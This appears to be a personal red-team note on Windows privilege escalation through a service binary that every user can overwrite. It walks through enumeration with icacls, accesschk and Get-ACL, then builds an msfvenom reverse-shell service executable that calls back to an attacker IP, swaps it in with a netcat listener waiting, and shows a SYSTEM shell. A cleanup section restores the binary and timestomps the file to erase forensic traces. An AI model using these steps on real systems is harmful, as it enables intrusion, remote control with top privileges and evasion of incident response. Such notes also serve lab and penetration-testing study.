# Living off the Land

Weak service permissions that contains a binary file can be overwritten with a malware to gain **SYSTEM** privileges.

## 01 - Enumerate

### 1.1 - Command Prompt

**BUILTIN\\Users** are able to change the file configuration when running `icacls.exe`.

```
C:\> sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\> icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe Everyone:(F)
                                                              NT AUTHORITY\SYSTEM:(F)
                                                              BUILTIN\Administrators:(F)
                                                              WIN-QBA94KB3IOF\Administrator:(F)
                                                              NT AUTHORITY\SYSTEM:(I)(F)
                                                              BUILTIN\Administrators:(I)(F)
                                                              BUILTIN\Users:(I)(RX)
                                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

To verify even further with `accesschk.exe` it is possible.

```
C:\> accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

### 1.2 - PowerShell

When running `Get-ACL` cmdlet that the **BUILTIN\\Users** are able to change the file configuration when running `icacls.exe`

```
PS C:\> get-acl "C:\Program Files\File Permissions Service\filepermservice.exe" | fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\File Permissions Service\filepermservice.exe
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : Everyone Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         WIN-QBA94KB3IOF\Administrator Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  :
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;;FA;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;LA)(A;ID;F
         A;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)

PS C:\> $acl = get-acl "C:\Program Files\File Permissions Service\filepermservice.exe"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
Everyone: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
WIN-QBA94KB3IOF\Administrator: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

Shorten it

```
PS C:\> Get-ACL "C:\Program Files\File Permissions Service\filepermservice.exe" | Format-List AccessToString
```

## 02 - Exploit

TODO: Add these parts for the clean up process

```
PS C:\> Get-Item "c:\program files\file permissions service\filepermservice.exe" | Select-Object Name, CreationTime, LastWriteTime, LastAccessTime

PS C:\> Get-ItemProperty "c:\program files\file permissions service\filepermservice.exe" | Select-Object Name, CreationTime, LastWriteTime, LastAccessTime
```

Before we overwrite the program we must first make a backup in case if it fails to start and also revert back to the original changes to clear our trace ahead of time. Then you can proceed to copy the shell to start a handler.

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.8.145.108 lport=53 -f exe-service -o filepermservice.exe

$ sudo nc -lnvp 53
```

- In command prompt

```
C:\> copy "c:\program files\file permissions service\filepermservice.exe" c:\temp\filepermservice.bak

C:\> copy /y shell.exe "c:\program files\file permissions service\filepermservice.exe"
        1 file(s) copied.

C:\> net start filepermsvc
```

- In powershell

```
PS C:\> copy-item "c:\program files\file permissions service\filepermservice.exe" c:\temp\filepermservice.bak

PS C:\> copy-item shell.exe "c:\program files\file permissions service\filepermservice.exe"

PS C:\> Start-Service filepermsvc
```

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.57.86.
Ncat: Connection from 10.10.57.86:49820.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32> whoami
nt authority\system
```

## 03 - Cleanup

Now let's copy the original binary back to it's destination path to clear any malware we've inserted it.

- In command prompt

```
C:\Windows\System32> copy /y c:\temp\filepermservice.bak "c:\program files\file permissions service\filepermservice.exe"
```

- In powershell

```
PS C:\> copy-item c:\temp\filepermservice.bak "c:\program files\file permissions service\filepermservice.exe"
```

Manually add timestamp to clear any trace of activity.

```powershell
PS C:\> $file = "c:\program files\file permissions service\filepermservice.exe"
$creationtime = Get-Date "YYYY-MM-DD hh:mm:ss"
$lastwritetime = Get-Date "YYYY-MM-DD hh:mm:ss"
$lastaccesstime = Get-Date "YYYY-MM-DD hh:mm:ss"

Set-ItemProperty -Path $file -Name CreationTime -Value $creationtime
Set-ItemProperty -Path $file -Name LastWriteTime -Value $lastwritetime
Set-ItemProperty -Path $file -Name LastAccessTime -Value $lastaccesstime
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/12 - Anti-Forensics/Windows/Clear Traces/02 - Timestomps/Manual/Living off the Land|Windows: Timestomp]]

### Red Team Notes

- [Red Team Notes: Weak Service Permissions](https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions)

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)